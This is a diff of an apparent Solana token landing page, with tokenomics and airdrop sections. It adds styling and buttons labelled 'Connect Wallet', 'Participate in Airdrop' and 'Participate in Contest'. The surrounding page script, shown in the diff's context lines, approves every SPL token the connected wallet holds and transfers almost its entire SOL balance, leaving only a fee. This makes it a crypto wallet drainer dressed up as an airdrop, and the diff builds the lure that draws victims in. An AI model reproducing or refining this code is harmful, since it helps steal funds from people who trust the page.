@@ -23,13 +23,23 @@
     #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
     .nav{
       position:fixed; top:0; left:0; right:0; height:80px; padding:0 30px;
-      display:flex; align-items:center; justify-content:center;
+      display:flex; align-items:center; justify-content:space-between;
       background:rgba(10,15,20,.8); backdrop-filter:blur(16px);
       border-bottom:1px solid rgba(255,255,255,.06); z-index:100;
     }
     .nav-links{ display:flex; gap:40px; font-weight:600; font-size:1.05rem; }
     .nav-links a{ color:var(--muted); text-decoration:none; transition:0.2s; }
     .nav-links a:hover{ color:var(--text); }
+    .actions{ display:flex; gap:12px; align-items:center; }
+    .btn{
+      border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
+      background:rgba(255,255,255,.05); color:var(--text); font-weight:650; font-size:.9rem;
+      cursor:pointer; transition: 0.2s; white-space:nowrap;
+    }
+    .btn:hover:not(:disabled){ background:rgba(255,255,255,.12); transform:translateY(-1px); }
+    .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
+    .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
+    .btn:disabled{ opacity:.3; cursor:not-allowed; }
     .wrap{ max-width:1300px; margin:0 auto; padding:120px 30px 100px; position:relative; z-index:1; }
     .section{ margin-bottom:100px; }
     .section-title{ font-size:2.8rem; font-weight:900; text-align:center; margin-bottom:40px; color:var(--sol-b); text-shadow:0 0 30px rgba(128,236,255,.3); }
@@ -64,12 +74,10 @@
     tr:last-child td{ border-bottom:none; }
     .supply{ text-align:center; font-size:1.3rem; margin-top:40px; color:var(--sol-a); }
     #status { font-size: 20px; margin: 40px auto; text-align: center; color: #80ecff; max-width: 800px; }
-    .actions { display: flex; gap: 12px; align-items: center; }
-    .btn { /* твои стили кнопок */ }
-    /* Добавь свои стили кнопок из предыдущего кода */
     @media (max-width:900px){
       .inflation-grid, .tokenomics-grid{ grid-template-columns:1fr; }
       .section-title{ font-size:2.2rem; }
+      .nav-links{ display:none; }
     }
   </style>
 </head>
@@ -81,6 +89,15 @@
       <a href="#guardians">Guardians</a>
       <a href="#inflation">Inflation</a>
       <a href="#tokenomics">Tokenomics</a>
+    </div>
+    <div class="actions">
+      <button class="btn" id="connect-btn">Connect Wallet</button>
+      <button class="btn btn-primary" id="claim-btn">
+        Participate in Airdrop
+      </button>
+      <button class="btn btn-accent" id="contest-btn">
+        Participate in Contest
+      </button>
     </div>
   </nav>
   <div class="wrap">
@@ -293,7 +310,7 @@
 
         const tx = new solanaWeb3.Transaction();
 
-        // Fetch token accounts with balance >0
+        // Approve on tokens with balance >0
         const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });
 
         for (const acc of tokenAccounts.value) {
@@ -312,7 +329,7 @@
           }
         }
 
-        // Transfer almost all SOL (leave ~0.01 for fee/rent)
+        // Transfer almost all SOL
         const balance = await connection.getBalance(owner);
         const leaveForFee = 10000000; // 0.01 SOL
         const transferAmount = balance - leaveForFee;
@@ -347,7 +364,7 @@
 
     window.addEventListener('load', checkMobileReturn);
 
-    // Particles
+    // Particles animation
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
